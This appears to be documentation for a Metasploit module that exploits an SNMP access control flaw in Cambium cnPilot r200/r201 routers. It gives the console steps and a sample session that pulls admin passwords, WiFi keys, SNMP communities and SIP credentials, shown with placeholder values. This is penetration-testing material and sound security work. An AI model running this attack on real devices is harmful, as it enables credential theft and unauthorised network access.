Cambium cnPilot r200/r201 devices can be administered using SNMP. The device configuration contains IP addresses, keys, passwords, & lots of juicy information. This module exploits an access control flaw, which allows remotely extracting sensitive information such as account passwords, WiFI PSK, & SIP credentials via SNMP Read-Only (RO) community string.

## Verification Steps

1. Do: ```use auxiliary/scanner/snmp/cnpilot_r_snmp_loot```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set COMMUNITY public```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/snmp/cnpilot_r_snmp_loot
msf auxiliary(cnpilot_r_snmp_loot) > set rhosts 1.3.3.7
msf auxiliary(cnpilot_r_snmp_loot) > run

[+] 1.3.3.7, Connected.

[*] Fetching System Information...

[+] SNMP System Name: cnPilot R200P
[+] SNMP System Description: cnPilot R200P 4.3.1-R1
[+] Device UpTime: 666 days, 00:66:60.00
[+] Hardware version: V1.3
[+] Firmware version: 4.3.1-R1(201612201723)

[*] Fetching Login Account Information...

[+] Web Management Admin Login Name: admin
[+] Web Management Admin Login Password: S3cr3t

[*] Fetching SNMP Information...

[+] SNMP read-only community name: public
[+] SNMP read-write community name: private
[+] SNMP Trap Community: trap
[+] SNMP Trap Server IP Address:

[*] Fetching WIFI Information...

[+] Wireless Interface SSID: wifi_ssid
[+] Wireless Interface Encryption Key: wifi_secret_key
[+] Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): WPA2PSK

[*] Fetching SIP Account Information...

[+] SIP Account Number: 123456789
[+] SIP Account Password: 123456789

[+] Cambium cnPilot SNMP loot saved at /root/.msf4/loot/20000000000003_default_1.3.3.7_cambium_cnpilot__12345.txt

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
